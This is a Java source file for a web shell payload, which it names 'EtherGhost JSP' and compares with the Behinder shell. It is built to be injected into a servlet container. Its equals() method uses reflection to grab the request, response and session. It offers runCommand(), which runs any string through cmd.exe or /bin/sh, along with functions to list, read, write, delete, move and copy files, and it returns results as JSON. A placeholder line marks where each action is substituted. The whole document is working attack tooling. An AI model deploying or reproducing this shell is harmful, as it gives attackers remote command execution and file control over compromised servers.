import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.PosixFilePermission;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Payload {
    // public static void main(String args[]) {
    // Payload payload = (new Payload());
    // Object result = payload.listFiles("./");
    // StringBuilder sb = new StringBuilder();
    // payload.jsonEncodeObject(sb, result);
    // System.out.println(sb.toString());
    // }

    public boolean equals(Object obj) {
        try {
            serve(obj);
        } catch (Exception e) {

        }
        return true;
    }

    public void serve(Object obj) throws Exception {
        Object request = obj.getClass()
                .getMethod("getRequest", new Class[0])
                .invoke(obj, new Object[0]);
        Object response = obj.getClass()
                .getMethod("getResponse", new Class[0])
                .invoke(obj, new Object[0]);
        Object session = obj.getClass()
                .getMethod("getSession", new Class[0])
                .invoke(obj, new Object[0]);
        String msg = action();
        Object so = response.getClass().getMethod("getOutputStream", new Class[0]).invoke(response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        write.invoke(so, msg.getBytes("UTF-8"));
        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
    }

    private void jsonEncodeObject(StringBuilder sb, Object o) throws IllegalArgumentException {
        if (o instanceof String) {
            jsonEncodeString(sb, (String) o);
        } else if (o instanceof Integer) {
            jsonEncodeInteger(sb, (Integer) o);
        } else if (o instanceof Long) {
            jsonEncodeInteger(sb, ((Long) o).intValue());
        } else if (o instanceof Boolean) {
            jsonEncodeBoolean(sb, (Boolean) o);
        } else if (o instanceof ArrayList) {
            jsonEncodeList(sb, (ArrayList) o);
        } else if (o instanceof HashMap) {
            jsonEncodeMap(sb, (HashMap) o);
        } else if (o.getClass().isArray()) {
            jsonEncodeList(sb, Arrays.asList(((Object[]) o)));
        } else {
            throw new IllegalArgumentException(o.getClass().getName());
        }
    }

    private void jsonEncodeMap(StringBuilder sb, Map<String, Object> m) {
        sb.append("{");
        Boolean hasdata = false;
        for (String key : m.keySet()) {
            if (hasdata) {
                sb.append(",");
            }
            jsonEncodeString(sb, key);
            sb.append(":");
            jsonEncodeObject(sb, m.get(key));
            hasdata = true;
        }
        sb.append("}");
    }

    private void jsonEncodeList(StringBuilder sb, List<Object> l) {
        sb.append("[");
        for (int i = 0; i < l.size(); i++) {
            jsonEncodeObject(sb, l.get(i));
            if (i != l.size() - 1) {
                sb.append(",");
            }
        }
        sb.append("]");
    }

    private void jsonEncodeString(StringBuilder sb, String s) {
        sb.append("\"");
        int p = 0;
        while (p < s.length()) {
            Matcher match = Pattern.compile("^[a-zA-Z0-9-_]+").matcher(s.substring(p));
            if (match.find()) {
                sb.append(s.substring(p, p + match.end()));
                p += match.end();
            } else {
                int codePoint = s.codePointAt(p);
                if (codePoint < 0xffff) {
                    sb.append(String.format("\\u%04x", codePoint));
                    p += 1;
                } else {
                    sb.append(String.format("\\u%04x", 0xD800 + ((codePoint - 0x10000) / 0x400)));
                    sb.append(String.format("\\u%04x", 0xDC00 + ((codePoint - 0x10000) % 0x400)));
                    p += 2;
                }
            }
        }
        sb.append("\"");
    }

    private void jsonEncodeInteger(StringBuilder sb, Integer x) {
        sb.append(String.format("%d", x));
    }

    private void jsonEncodeBoolean(StringBuilder sb, Boolean x) {
        sb.append(String.valueOf(x));
    }

    private LinkedList<String> readStream(InputStream stream, Charset osCharset) throws IOException {
        LinkedList<String> result = new LinkedList<String>();
        BufferedReader br = new BufferedReader(new InputStreamReader(stream, osCharset));
        String line = br.readLine();
        while (line != null && line != "") {
            result.add(line);
            line = br.readLine();
        }
        return result;
    }

    private static String getFileType(File file) {
        String type = "";
        if (file.isFile()) {
            type = "file";
        } else if (file.isDirectory()) {
            type = "dir";
        } else {
            return "unknown";
        }
        if (Files.isSymbolicLink(file.toPath())) {
            type = "link-" + type;
        }
        return type;
    }

    private static String getFilePermission(File file) {
        Path path = Paths.get(file.getAbsolutePath());
        try {
            Set<PosixFilePermission> perms = Files.getPosixFilePermissions(path);
            return PosixFilePermissions.toString(perms);
        } catch (Exception e) {
            return "---------";
        }
    }

    public String base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    public int base64GetShift(char c) {
        return (c == '=' ? 0 : base64Chars.indexOf(c));
    }

    public byte[] base64Decode(String b) throws IndexOutOfBoundsException {
        List<Byte> resultList = new ArrayList<>();
        int blength = b.length();
        if (blength == 0) {
            return new byte[0];
        }
        for (int i = 0; i < blength; i += 4) {
            int x = (base64GetShift(b.charAt(i)) << 18) + (base64GetShift(b.charAt(i + 1)) << 12)
                    + (base64GetShift(b.charAt(i + 2)) << 6)
                    + base64GetShift(b.charAt(i + 3));
            int count = (i + 4 < blength ? 3 : b.indexOf('=') - i - 1);
            for (int k = 0; k < count; k++) {
                resultList.add((byte) (x >>> (16 - k * 8)));
            }
        }
        byte[] result = new byte[resultList.size()];
        for (int i = 0; i < resultList.size(); i++) {
            result[i] = resultList.get(i);
        }
        return result;
    }

    public String base64Encode(byte[] b) throws IndexOutOfBoundsException {
        String result = "";
        for (int i = 0; i < b.length; i += 3) {
            int count = (i + 3 < b.length) ? 4 : (b.length - i + 1);
            int x = 0;
            for (int j = 0; i + j < b.length && j < 3; j++) {
                x += (((int) b[i + j]) << (16 - 8 * j));
            }
            for (int j = 0; j < count; j++) {
                result += base64Chars.charAt((x >> (18 - 6 * j)) % 64);
            }
            result += "=".repeat(4 - count);
        }
        return result;
    }

    public byte[] getFileContentsBytes(String filePath, int max_length) throws IOException {
        FileInputStream fis = new FileInputStream(filePath);
        byte[] buffer = new byte[max_length];
        int len = fis.read(buffer);
        fis.close();
        if(len==-1) {
            return new byte[0];
        }if (len < max_length) {
            byte[] result = new byte[len];
            System.arraycopy(buffer, 0, result, 0, len);
            return result;
        } else {
            return buffer;
        }
    }

    // actions:

    public ArrayList<String> runCommand(String command) throws IOException, IllegalArgumentException {
        Process p;
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        if (command == null || command.length() == 0) {
            throw new IllegalArgumentException("Wrong command");
        }
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", command });
        } else {
            p = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command });
        }
        ArrayList<String> result = new ArrayList<String>();
        result.addAll(readStream(p.getInputStream(), osCharset));
        result.addAll(readStream(p.getErrorStream(), osCharset));
        return result;
    }

    public String mkdir(String dir_path) {
        (new File(dir_path)).mkdir();
        return dir_path;
    }

    public static ArrayList<Map<String, Object>> listFiles(String dirPath) {
        ArrayList<Map<String, Object>> result = new ArrayList<>();
        File dir = new File(dirPath);
        if (dir.isDirectory()) {
            for (File file : dir.listFiles()) {
                String fileName = file.getName();
                String fileType = getFileType(file);
                long fileSize = file.length();
                String filePermission = getFilePermission(file);
                Map<String, Object> item = new HashMap<>();
                item.put("name", fileName);
                item.put("permission", filePermission);
                item.put("filesize", fileSize);
                item.put("entry_type", fileType);
                result.add(item);
            }
        }
        return result;
    }

    public String getFileContentsBase64(String filePath, int max_length) throws IOException {
        return base64Encode(getFileContentsBytes(filePath, max_length));
    }

    public boolean putFileContents(String filepath, byte[] content) throws Exception {
        FileOutputStream fos = new FileOutputStream(filepath);
        fos.write(content);
        fos.close();
        return getFileContentsBytes(filepath, content.length) == content;
    }

    public boolean deleteFile(String filepath) throws IOException {
        File file = new File(filepath);
        if (!file.exists()) {
            throw new IOException("File not exists");
        }
        if (!file.canWrite()) {
            throw new IOException("No permission");
        }
        return file.delete();
    }

    public boolean moveFile(String filepath, String newFilepath) throws IOException {
        File file = new File(filepath);
        if (!file.exists()) {
            throw new IOException("File not exists");
        }
        if (!file.canWrite()) {
            throw new IOException("No permission to move original file");
        }

        boolean result = file.renameTo(new File(newFilepath));
        if (!result) {
            throw new IOException("Move file failed");
        }
        return true;
    }

    public boolean copyFile(String filepath, String newFilepath) throws IOException {
        Path file = Paths.get(filepath);
        if(!Files.exists(file)) {
            throw new IOException("File not exists");
        }
        Path newfile = Paths.get(newFilepath);
        Files.copy(file, newfile);
        return true;
    }

    public String getPwd() {
        return System.getProperty("user.dir");
    }

    public HashMap<String, Object> ping() {
        HashMap<String, Object> map = new HashMap<>();
        map.put("name", "EtherGhost JSP");
        map.put("version", "idk, maybe v0.0.0.1");
        map.put("messages", new Object[] {
                "Unlike crappy json encoder in Behinder",
                "I got full json support",
                "Aaaaaaand unicode\ud83d\ude07",
                "My list can mix numbers and strings like",
                114514,
                "and this"
        });
        map.put("test_base64", base64Encode("idk, maybe v0.0.0.1".getBytes()));
        return map;
    }

    public String action() {
        HashMap<String, Object> map = new HashMap<>();
        map.put("code", 0);
        try {
            Object data = "replace me"; // ETHER_GHOST_REPLACE_HERE
            map.put("data", data);
        } catch (Exception e) {
            map.put("code", -100);
            map.put("error_type", e.getClass().getName());
            map.put("msg", e.getLocalizedMessage());
        }
        StringBuilder sb = new StringBuilder();
        jsonEncodeObject(sb, map);
        return sb.toString();
    }
}
